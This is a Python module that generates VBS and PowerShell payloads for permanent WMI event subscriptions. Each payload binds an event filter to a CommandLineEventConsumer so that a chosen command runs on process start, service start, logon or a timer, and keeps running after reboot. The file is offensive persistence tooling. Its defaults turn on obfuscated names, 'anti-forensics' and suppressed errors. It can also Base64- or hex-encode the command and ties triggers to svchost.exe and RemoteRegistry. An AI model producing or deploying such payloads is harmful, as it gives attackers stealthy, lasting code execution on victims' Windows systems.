#!/usr/bin/env python3
"""
WMI Event Subscription for Asynchronous Execution
Implements event-driven command execution through WMI event subscriptions.
Provides methods for persistent, trigger-based command execution without polling.
"""

import base64
import hashlib
import random
import string
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import json


class EventTriggerType(Enum):
    """WMI Event Trigger Types"""
    PROCESS_START = "ProcessStart"
    PROCESS_STOP = "ProcessStop"
    SERVICE_START = "ServiceStart"
    SERVICE_STOP = "ServiceStop"
    NETWORK_ADAPTER_CONFIG = "NetworkAdapterConfig"
    DISK_SPACE_LOW = "DiskSpaceLow"
    SYSTEM_TIME_CHANGE = "SystemTimeChange"
    USER_LOGIN = "UserLogin"
    USER_LOGOUT = "UserLogout"
    REGISTRY_CHANGE = "RegistryChange"
    FILE_CHANGE = "FileChange"
    WMI_CONSUMER_TIMER = "TimerEvent"
    CUSTOM = "Custom"


class EventBindingType(Enum):
    """WMI Event Binding Types"""
    PERMANENT = "Permanent"  # Survives system reboot
    TEMPORARY = "Temporary"  # Session-only


@dataclass
class EventSubscriptionConfig:
    """Configuration for WMI event subscription"""
    event_trigger: EventTriggerType = EventTriggerType.PROCESS_START
    event_filter_name: str = "AutoStartEvent"
    consumer_name: str = "CommandConsumer"
    binding_type: EventBindingType = EventBindingType.PERMANENT
    namespace: str = "root\\subscription"
    obfuscate_names: bool = True
    use_indirect_binding: bool = True
    add_anti_forensics: bool = True
    hide_errors: bool = True


class WMIEventSubscription:
    """
    WMI Event Subscription for asynchronous command execution
    Implements various event trigger types and execution mechanisms
    """

    def __init__(self, config: Optional[EventSubscriptionConfig] = None):
        self.config = config or EventSubscriptionConfig()
        self._var_cache: Dict[str, str] = {}

    def _generate_random_name(self, prefix: str = "v") -> str:
        """Generate random variable name for obfuscation"""
        if not self.config.obfuscate_names:
            return prefix
        suffix = ''.join(random.choices(string.ascii_letters, k=8))
        return f"{prefix}_{suffix}"

    def _get_or_create_var(self, key: str, prefix: str = "v") -> str:
        """Get cached variable name or create new one"""
        if key not in self._var_cache:
            self._var_cache[key] = self._generate_random_name(prefix)
        return self._var_cache[key]

    def generate_event_filter_wql(self, trigger_type: EventTriggerType) -> str:
        """
        Generate WQL (WMI Query Language) for event filter

        Args:
            trigger_type: Type of event to trigger on

        Returns:
            WQL query string
        """
        wql_queries = {
            EventTriggerType.PROCESS_START: (
                'SELECT * FROM __InstanceCreationEvent '
                'WHERE TargetInstance ISA "Win32_Process" '
                'AND TargetInstance.Name!="wscript.exe"'
            ),
            EventTriggerType.PROCESS_STOP: (
                'SELECT * FROM __InstanceDeletionEvent '
                'WHERE TargetInstance ISA "Win32_Process"'
            ),
            EventTriggerType.SERVICE_START: (
                'SELECT * FROM __InstanceModificationEvent '
                'WHERE TargetInstance ISA "Win32_Service" '
                'AND TargetInstance.State="Running"'
            ),
            EventTriggerType.SERVICE_STOP: (
                'SELECT * FROM __InstanceModificationEvent '
                'WHERE TargetInstance ISA "Win32_Service" '
                'AND TargetInstance.State="Stopped"'
            ),
            EventTriggerType.NETWORK_ADAPTER_CONFIG: (
                'SELECT * FROM __InstanceModificationEvent '
                'WHERE TargetInstance ISA "Win32_NetworkAdapterConfiguration"'
            ),
            EventTriggerType.DISK_SPACE_LOW: (
                'SELECT * FROM __InstanceModificationEvent '
                'WHERE TargetInstance ISA "Win32_LogicalDisk" '
                'AND TargetInstance.FreeSpace < 1000000000'
            ),
            EventTriggerType.SYSTEM_TIME_CHANGE: (
                'SELECT * FROM Win32_ProcessTrace '
                'WHERE EventType=3'
            ),
            EventTriggerType.USER_LOGIN: (
                'SELECT * FROM __InstanceCreationEvent '
                'WHERE TargetInstance ISA "Win32_LogonSession"'
            ),
            EventTriggerType.USER_LOGOUT: (
                'SELECT * FROM __InstanceDeletionEvent '
                'WHERE TargetInstance ISA "Win32_LogonSession"'
            ),
            EventTriggerType.REGISTRY_CHANGE: (
                'SELECT * FROM RegistryKeyChangeEvent '
                'WHERE Hive="HKEY_LOCAL_MACHINE"'
            ),
            EventTriggerType.FILE_CHANGE: (
                'SELECT * FROM __InstanceModificationEvent '
                'WHERE TargetInstance ISA "CIM_DataFile"'
            ),
            EventTriggerType.WMI_CONSUMER_TIMER: (
                'SELECT * FROM __TimerEvent '
                'WHERE TimerInterval=60000'
            ),
        }

        return wql_queries.get(trigger_type, wql_queries[EventTriggerType.PROCESS_START])

    def generate_event_subscription_vbs(self, command: str,
                                       trigger_type: EventTriggerType = EventTriggerType.PROCESS_START) -> str:
        """
        Generate VBS script for permanent WMI event subscription
        Creates event filter, consumer, and binding

        Args:
            command: Command to execute on event
            trigger_type: Type of event to subscribe to

        Returns:
            VBS payload for event subscription
        """
        var_locator = self._get_or_create_var("locator", "evtLoc")
        var_svc = self._get_or_create_var("service", "evtSvc")
        var_filter = self._get_or_create_var("filter", "evtFlt")
        var_consumer = self._get_or_create_var("consumer", "evtCon")
        var_binding = self._get_or_create_var("binding", "evtBnd")
        var_filter_path = self._get_or_create_var("filter_path", "fltPath")
        var_consumer_path = self._get_or_create_var("consumer_path", "conPath")

        wql_filter = self.generate_event_filter_wql(trigger_type)
        filter_name = self.config.event_filter_name
        consumer_name = self.config.consumer_name

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_filter}, {var_consumer}, {var_binding}
Dim {var_filter_path}, {var_consumer_path}
On Error Resume Next

' Create WMI connection to subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "{self.config.namespace}")

' Create Event Filter
Set {var_filter} = {var_svc}.Get("__EventFilter").SpawnInstance_()
{var_filter}.Name = "{filter_name}"
{var_filter}.QueryLanguage = "WQL"
{var_filter}.Query = "{wql_filter}"
{var_svc}.Put {var_filter}
Set {var_filter_path} = {var_svc}.Get("__EventFilter.Name='" & {var_filter}.Name & "'")

' Create Command Line Consumer
Set {var_consumer} = {var_svc}.Get("CommandLineEventConsumer").SpawnInstance_()
{var_consumer}.Name = "{consumer_name}"
{var_consumer}.CommandLineTemplate = "{command}"
{var_consumer}.RunInteractively = False
{var_svc}.Put {var_consumer}
Set {var_consumer_path} = {var_svc}.Get("CommandLineEventConsumer.Name='" & {var_consumer}.Name & "'")

' Create Binding between Filter and Consumer
Set {var_binding} = {var_svc}.Get("__FilterToConsumerBinding").SpawnInstance_()
{var_binding}.Filter = {var_filter_path}.Path_
{var_binding}.Consumer = {var_consumer_path}.Path_
{var_svc}.Put {var_binding}

' Cleanup
Set {var_binding} = Nothing
Set {var_consumer_path} = Nothing
Set {var_consumer} = Nothing
Set {var_filter_path} = Nothing
Set {var_filter} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_async_event_handler(self, command: str,
                                    event_name: str = "ProcessStart") -> str:
        """
        Generate asynchronous event handler for WMI events
        Executes command when specific WMI event occurs

        Args:
            command: Command to execute
            event_name: Name of event to handle

        Returns:
            VBS event handler code
        """
        var_sink = self._get_or_create_var("sink", "evtSink")
        var_locator = self._get_or_create_var("locator", "asyncLoc")
        var_svc = self._get_or_create_var("service", "asyncSvc")
        var_process = self._get_or_create_var("process", "asyncProc")

        vbs_code = f'''
Class {var_sink}
    Dim {self._get_or_create_var("executed", "isExec")}

    Public Sub OnObjectReady(objObject, objAsyncContext)
        On Error Resume Next
        Dim {var_locator}, {var_svc}, {var_process}
        Dim {self._get_or_create_var("result", "execRes")}

        ' Connect to WMI service
        Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
        Set {var_svc} = {var_locator}.ConnectServer(".", "root\\cimv2")

        ' Get Win32_Process class
        Set {var_process} = {var_svc}.Get("Win32_Process")

        ' Execute command asynchronously
        Set {self._get_or_create_var("result")} = {var_process}.Create("{command}")

        ' Cleanup
        Set {var_process} = Nothing
        Set {var_svc} = Nothing
        Set {var_locator} = Nothing
        On Error GoTo 0
    End Sub

    Public Sub OnObjectPut(objObject, objAsyncContext)
        Call OnObjectReady(objObject, objAsyncContext)
    End Sub

    Public Sub OnCompleted(iHResult, objErrorObject, objAsyncContext)
        ' Event handling complete
        On Error Resume Next
    End Sub
End Class

' Async event handler instantiation
Dim {var_sink}
Set {var_sink} = New {var_sink}
'''
        return vbs_code.strip()

    def generate_event_trigger_subscription(self, command: str,
                                           process_name: str = "svchost.exe") -> str:
        """
        Generate subscription that triggers on specific process activity

        Args:
            command: Command to execute
            process_name: Process to monitor for startup

        Returns:
            VBS subscription setup code
        """
        var_locator = self._get_or_create_var("locator", "trigLoc")
        var_svc = self._get_or_create_var("service", "trigSvc")
        var_filter = self._get_or_create_var("filter", "trigFlt")
        var_consumer = self._get_or_create_var("consumer", "trigCon")
        var_binding = self._get_or_create_var("binding", "trigBnd")
        var_filter_path = self._get_or_create_var("filter_path", "trigFlp")
        var_consumer_path = self._get_or_create_var("consumer_path", "trigCnp")

        wql_filter = (
            f'SELECT * FROM __InstanceCreationEvent '
            f'WHERE TargetInstance ISA "Win32_Process" '
            f'AND TargetInstance.Name="{process_name}"'
        )

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_filter}, {var_consumer}, {var_binding}
Dim {var_filter_path}, {var_consumer_path}
On Error Resume Next

' Connect to WMI subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

' Create event filter for process startup
Set {var_filter} = {var_svc}.Get("__EventFilter").SpawnInstance_()
{var_filter}.Name = "{self.config.event_filter_name}_Trigger"
{var_filter}.QueryLanguage = "WQL"
{var_filter}.Query = "{wql_filter}"
{var_svc}.Put {var_filter}
Set {var_filter_path} = {var_svc}.Get("__EventFilter.Name='" & {var_filter}.Name & "'")

' Create command line consumer
Set {var_consumer} = {var_svc}.Get("CommandLineEventConsumer").SpawnInstance_()
{var_consumer}.Name = "{self.config.consumer_name}_Trigger"
{var_consumer}.CommandLineTemplate = "{command}"
{var_consumer}.RunInteractively = False
{var_svc}.Put {var_consumer}
Set {var_consumer_path} = {var_svc}.Get("CommandLineEventConsumer.Name='" & {var_consumer}.Name & "'")

' Bind filter to consumer
Set {var_binding} = {var_svc}.Get("__FilterToConsumerBinding").SpawnInstance_()
{var_binding}.Filter = {var_filter_path}.Path_
{var_binding}.Consumer = {var_consumer_path}.Path_
{var_svc}.Put {var_binding}

' Cleanup
Set {var_binding} = Nothing
Set {var_consumer_path} = Nothing
Set {var_consumer} = Nothing
Set {var_filter_path} = Nothing
Set {var_filter} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_timer_event_consumer(self, command: str, interval_milliseconds: int = 60000) -> str:
        """
        Generate timer-based event consumer for periodic execution

        Args:
            command: Command to execute
            interval_milliseconds: Interval between executions (default 60 seconds)

        Returns:
            VBS code for timer-based execution
        """
        var_locator = self._get_or_create_var("locator", "timerLoc")
        var_svc = self._get_or_create_var("service", "timerSvc")
        var_filter = self._get_or_create_var("filter", "timerFlt")
        var_consumer = self._get_or_create_var("consumer", "timerCon")
        var_binding = self._get_or_create_var("binding", "timerBnd")
        var_filter_path = self._get_or_create_var("filter_path", "timerFlp")
        var_consumer_path = self._get_or_create_var("consumer_path", "timerCnp")

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_filter}, {var_consumer}, {var_binding}
Dim {var_filter_path}, {var_consumer_path}
On Error Resume Next

' Connect to subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

' Create timer event filter
Set {var_filter} = {var_svc}.Get("__EventFilter").SpawnInstance_()
{var_filter}.Name = "{self.config.event_filter_name}_Timer"
{var_filter}.QueryLanguage = "WQL"
{var_filter}.Query = "SELECT * FROM __TimerEvent WHERE TimerInterval={interval_milliseconds}"
{var_svc}.Put {var_filter}
Set {var_filter_path} = {var_svc}.Get("__EventFilter.Name='" & {var_filter}.Name & "'")

' Create command line consumer
Set {var_consumer} = {var_svc}.Get("CommandLineEventConsumer").SpawnInstance_()
{var_consumer}.Name = "{self.config.consumer_name}_Timer"
{var_consumer}.CommandLineTemplate = "{command}"
{var_consumer}.RunInteractively = False
{var_svc}.Put {var_consumer}
Set {var_consumer_path} = {var_svc}.Get("CommandLineEventConsumer.Name='" & {var_consumer}.Name & "'")

' Bind filter to consumer
Set {var_binding} = {var_svc}.Get("__FilterToConsumerBinding").SpawnInstance_()
{var_binding}.Filter = {var_filter_path}.Path_
{var_binding}.Consumer = {var_consumer_path}.Path_
{var_svc}.Put {var_binding}

' Cleanup
Set {var_binding} = Nothing
Set {var_consumer_path} = Nothing
Set {var_consumer} = Nothing
Set {var_filter_path} = Nothing
Set {var_filter} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_service_startup_consumer(self, command: str,
                                         service_name: str = "RemoteRegistry") -> str:
        """
        Generate consumer that executes on service startup

        Args:
            command: Command to execute
            service_name: Service to monitor

        Returns:
            VBS code for service-triggered execution
        """
        var_locator = self._get_or_create_var("locator", "svcLoc")
        var_svc = self._get_or_create_var("service", "svcSvc")
        var_filter = self._get_or_create_var("filter", "svcFlt")
        var_consumer = self._get_or_create_var("consumer", "svcCon")
        var_binding = self._get_or_create_var("binding", "svcBnd")
        var_filter_path = self._get_or_create_var("filter_path", "svcFlp")
        var_consumer_path = self._get_or_create_var("consumer_path", "svcCnp")

        wql_filter = (
            f'SELECT * FROM __InstanceModificationEvent '
            f'WHERE TargetInstance ISA "Win32_Service" '
            f'AND TargetInstance.Name="{service_name}" '
            f'AND TargetInstance.State="Running"'
        )

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_filter}, {var_consumer}, {var_binding}
Dim {var_filter_path}, {var_consumer_path}
On Error Resume Next

' Connect to subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

' Create service startup event filter
Set {var_filter} = {var_svc}.Get("__EventFilter").SpawnInstance_()
{var_filter}.Name = "{self.config.event_filter_name}_Service"
{var_filter}.QueryLanguage = "WQL"
{var_filter}.Query = "{wql_filter}"
{var_svc}.Put {var_filter}
Set {var_filter_path} = {var_svc}.Get("__EventFilter.Name='" & {var_filter}.Name & "'")

' Create command line consumer
Set {var_consumer} = {var_svc}.Get("CommandLineEventConsumer").SpawnInstance_()
{var_consumer}.Name = "{self.config.consumer_name}_Service"
{var_consumer}.CommandLineTemplate = "{command}"
{var_consumer}.RunInteractively = False
{var_svc}.Put {var_consumer}
Set {var_consumer_path} = {var_svc}.Get("CommandLineEventConsumer.Name='" & {var_consumer}.Name & "'")

' Bind filter to consumer
Set {var_binding} = {var_svc}.Get("__FilterToConsumerBinding").SpawnInstance_()
{var_binding}.Filter = {var_filter_path}.Path_
{var_binding}.Consumer = {var_consumer_path}.Path_
{var_svc}.Put {var_binding}

' Cleanup
Set {var_binding} = Nothing
Set {var_consumer_path} = Nothing
Set {var_consumer} = Nothing
Set {var_filter_path} = Nothing
Set {var_filter} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_event_subscription_removal(self, filter_name: Optional[str] = None,
                                           consumer_name: Optional[str] = None) -> str:
        """
        Generate code to remove WMI event subscriptions (cleanup)

        Args:
            filter_name: Event filter name to remove
            consumer_name: Consumer name to remove

        Returns:
            VBS code for cleanup
        """
        filter_name = filter_name or self.config.event_filter_name
        consumer_name = consumer_name or self.config.consumer_name

        var_locator = self._get_or_create_var("locator", "rmLoc")
        var_svc = self._get_or_create_var("service", "rmSvc")

        vbs_code = f'''
Dim {var_locator}, {var_svc}
On Error Resume Next

' Connect to subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

' Remove filter-consumer bindings
On Error Resume Next
{var_svc}.Get("__FilterToConsumerBinding").Delete()
On Error GoTo 0

' Remove event filter
On Error Resume Next
{var_svc}.Delete("__EventFilter.Name='"""{filter_name}""\"'")
On Error GoTo 0

' Remove command line consumer
On Error Resume Next
{var_svc}.Delete("CommandLineEventConsumer.Name='"""{consumer_name}""\"'")
On Error GoTo 0

' Cleanup
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_encoded_event_subscription(self, command: str,
                                           trigger_type: EventTriggerType = EventTriggerType.PROCESS_START,
                                           encoding: str = "base64") -> str:
        """
        Generate obfuscated event subscription with encoded command

        Args:
            command: Command to execute
            trigger_type: Event trigger type
            encoding: Encoding type (base64 or hex)

        Returns:
            VBS code with encoded execution
        """
        if encoding == "base64":
            encoded_cmd = base64.b64encode(command.encode()).decode()
            decoder = self._create_base64_decoder()
            cmd_exec = f'DecodeBase64Cmd("{encoded_cmd}")'
        elif encoding == "hex":
            encoded_cmd = command.encode().hex()
            decoder = self._create_hex_decoder()
            cmd_exec = f'DecodeHexCmd("{encoded_cmd}")'
        else:
            encoded_cmd = command
            decoder = ""
            cmd_exec = f'"{command}"'

        var_locator = self._get_or_create_var("locator", "encLoc")
        var_svc = self._get_or_create_var("service", "encSvc")
        var_filter = self._get_or_create_var("filter", "encFlt")
        var_consumer = self._get_or_create_var("consumer", "encCon")
        var_binding = self._get_or_create_var("binding", "encBnd")
        var_filter_path = self._get_or_create_var("filter_path", "encFlp")
        var_consumer_path = self._get_or_create_var("consumer_path", "encCnp")
        var_cmd = self._get_or_create_var("cmd", "encCmd")

        wql_filter = self.generate_event_filter_wql(trigger_type)

        vbs_code = f'''
{decoder}

Dim {var_locator}, {var_svc}, {var_filter}, {var_consumer}, {var_binding}
Dim {var_filter_path}, {var_consumer_path}, {var_cmd}
On Error Resume Next

' Decode command
{var_cmd} = {cmd_exec}

' Connect to subscription namespace
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\subscription")

' Create event filter
Set {var_filter} = {var_svc}.Get("__EventFilter").SpawnInstance_()
{var_filter}.Name = "{self.config.event_filter_name}"
{var_filter}.QueryLanguage = "WQL"
{var_filter}.Query = "{wql_filter}"
{var_svc}.Put {var_filter}
Set {var_filter_path} = {var_svc}.Get("__EventFilter.Name='" & {var_filter}.Name & "'")

' Create command line consumer with decoded command
Set {var_consumer} = {var_svc}.Get("CommandLineEventConsumer").SpawnInstance_()
{var_consumer}.Name = "{self.config.consumer_name}"
{var_consumer}.CommandLineTemplate = {var_cmd}
{var_consumer}.RunInteractively = False
{var_svc}.Put {var_consumer}
Set {var_consumer_path} = {var_svc}.Get("CommandLineEventConsumer.Name='" & {var_consumer}.Name & "'")

' Create binding
Set {var_binding} = {var_svc}.Get("__FilterToConsumerBinding").SpawnInstance_()
{var_binding}.Filter = {var_filter_path}.Path_
{var_binding}.Consumer = {var_consumer_path}.Path_
{var_svc}.Put {var_binding}

' Cleanup
Set {var_binding} = Nothing
Set {var_consumer_path} = Nothing
Set {var_consumer} = Nothing
Set {var_filter_path} = Nothing
Set {var_filter} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def _create_base64_decoder(self) -> str:
        """Create inline Base64 decoder function"""
        decoder_func = '''
Function DecodeBase64Cmd(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64Cmd = node.NodeTypedValue
End Function
'''
        return decoder_func.strip()

    def _create_hex_decoder(self) -> str:
        """Create inline Hex decoder function"""
        decoder_func = '''
Function DecodeHexCmd(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    DecodeHexCmd = r
End Function
'''
        return decoder_func.strip()

    def generate_powershell_event_subscription(self, command: str,
                                              trigger_type: EventTriggerType = EventTriggerType.PROCESS_START) -> str:
        """
        Generate PowerShell-based event subscription (alternative to VBS)

        Args:
            command: Command to execute
            trigger_type: Event trigger type

        Returns:
            PowerShell code for event subscription
        """
        wql_filter = self.generate_event_filter_wql(trigger_type)

        ps_code = f'''
# WMI Event Subscription
$filter_name = "{self.config.event_filter_name}"
$consumer_name = "{self.config.consumer_name}"

# Create WMI objects
$filter = New-Object System.Management.ManagementClass("root\\subscription", "__EventFilter", $null)
$filter["Name"] = $filter_name
$filter["QueryLanguage"] = "WQL"
$filter["Query"] = "{wql_filter}"
$filter.Put()

# Get filter path
$filter_path = "root\\subscription:__EventFilter.Name='$filter_name'"

# Create consumer
$consumer = New-Object System.Management.ManagementClass("root\\subscription", "CommandLineEventConsumer", $null)
$consumer["Name"] = $consumer_name
$consumer["CommandLineTemplate"] = "{command}"
$consumer["RunInteractively"] = $false
$consumer.Put()

# Get consumer path
$consumer_path = "root\\subscription:CommandLineEventConsumer.Name='$consumer_name'"

# Create binding
$binding = New-Object System.Management.ManagementClass("root\\subscription", "__FilterToConsumerBinding", $null)
$binding["Filter"] = $filter_path
$binding["Consumer"] = $consumer_path
$binding.Put()
'''
        return ps_code.strip()

    def generate_event_handler_summary(self) -> Dict[str, Dict[str, str]]:
        """Generate summary of all event handler types"""
        handlers = {
            "event_subscription": {
                "name": "Basic Event Subscription",
                "description": "Process/service triggered command execution",
                "trigger": EventTriggerType.PROCESS_START.value,
                "persistence": "Permanent (survives reboot)"
            },
            "async_handler": {
                "name": "Asynchronous Event Handler",
                "description": "Class-based async event handling",
                "trigger": "Custom events",
                "persistence": "Session-based"
            },
            "timer_consumer": {
                "name": "Timer-based Event Consumer",
                "description": "Periodic execution via timer events",
                "trigger": "Time interval",
                "persistence": "Permanent"
            },
            "service_startup": {
                "name": "Service Startup Consumer",
                "description": "Triggers on specific service startup",
                "trigger": EventTriggerType.SERVICE_START.value,
                "persistence": "Permanent"
            },
            "encoded_subscription": {
                "name": "Encoded Event Subscription",
                "description": "Obfuscated command with Base64/Hex encoding",
                "trigger": "Process/service events",
                "persistence": "Permanent"
            }
        }
        return handlers


def create_event_subscription(config: Optional[EventSubscriptionConfig] = None) -> WMIEventSubscription:
    """Factory function to create WMI event subscription"""
    return WMIEventSubscription(config or EventSubscriptionConfig())


def generate_event_subscription_payload(command: str,
                                       event_type: str = "process",
                                       **kwargs) -> str:
    """
    High-level function to generate event subscription payload

    Args:
        command: Command to execute
        event_type: Type of event (process, service, timer, encoded)
        **kwargs: Additional parameters

    Returns:
        VBS/PowerShell payload code
    """
    subscription = create_event_subscription()

    if event_type == "process":
        trigger_type = kwargs.get("trigger_type", EventTriggerType.PROCESS_START)
        return subscription.generate_event_subscription_vbs(command, trigger_type)
    elif event_type == "service":
        service_name = kwargs.get("service_name", "RemoteRegistry")
        return subscription.generate_service_startup_consumer(command, service_name)
    elif event_type == "timer":
        interval = kwargs.get("interval", 60000)
        return subscription.generate_timer_event_consumer(command, interval)
    elif event_type == "trigger":
        process_name = kwargs.get("process_name", "svchost.exe")
        return subscription.generate_event_trigger_subscription(command, process_name)
    elif event_type == "encoded":
        encoding = kwargs.get("encoding", "base64")
        trigger_type = kwargs.get("trigger_type", EventTriggerType.PROCESS_START)
        return subscription.generate_encoded_event_subscription(command, trigger_type, encoding)
    elif event_type == "async":
        return subscription.generate_async_event_handler(command)
    elif event_type == "powershell":
        trigger_type = kwargs.get("trigger_type", EventTriggerType.PROCESS_START)
        return subscription.generate_powershell_event_subscription(command, trigger_type)
    else:
        return subscription.generate_event_subscription_vbs(command)


if __name__ == "__main__":
    import sys

    print("=" * 80)
    print("WMI EVENT SUBSCRIPTION - Asynchronous Command Execution")
    print("=" * 80)

    test_command = "cmd.exe /c ipconfig"

    # Example 1: Basic event subscription
    print("\n[1] Basic Event Subscription (Process Startup)")
    print("-" * 80)
    subscription = create_event_subscription()
    payload = subscription.generate_event_subscription_vbs(test_command)
    print(payload)

    # Example 2: Timer-based consumer
    print("\n[2] Timer-based Event Consumer (60 seconds)")
    print("-" * 80)
    payload = subscription.generate_timer_event_consumer(test_command, 60000)
    print(payload)

    # Example 3: Service startup consumer
    print("\n[3] Service Startup Consumer")
    print("-" * 80)
    payload = subscription.generate_service_startup_consumer(test_command)
    print(payload)

    # Example 4: Async event handler
    print("\n[4] Asynchronous Event Handler")
    print("-" * 80)
    payload = subscription.generate_async_event_handler(test_command)
    print(payload)

    # Example 5: Encoded event subscription
    print("\n[5] Encoded Event Subscription (Base64)")
    print("-" * 80)
    payload = subscription.generate_encoded_event_subscription(test_command, encoding="base64")
    print(payload)

    # Example 6: PowerShell-based subscription
    print("\n[6] PowerShell Event Subscription")
    print("-" * 80)
    payload = subscription.generate_powershell_event_subscription(test_command)
    print(payload)

    # Summary
    print("\n[7] Event Handler Summary")
    print("-" * 80)
    report = subscription.generate_event_handler_summary()
    for key, handler_info in report.items():
        print(f"\n{handler_info['name']}")
        print(f"  Description: {handler_info['description']}")
        print(f"  Trigger: {handler_info['trigger']}")
        print(f"  Persistence: {handler_info['persistence']}")

    print("\n" + "=" * 80)
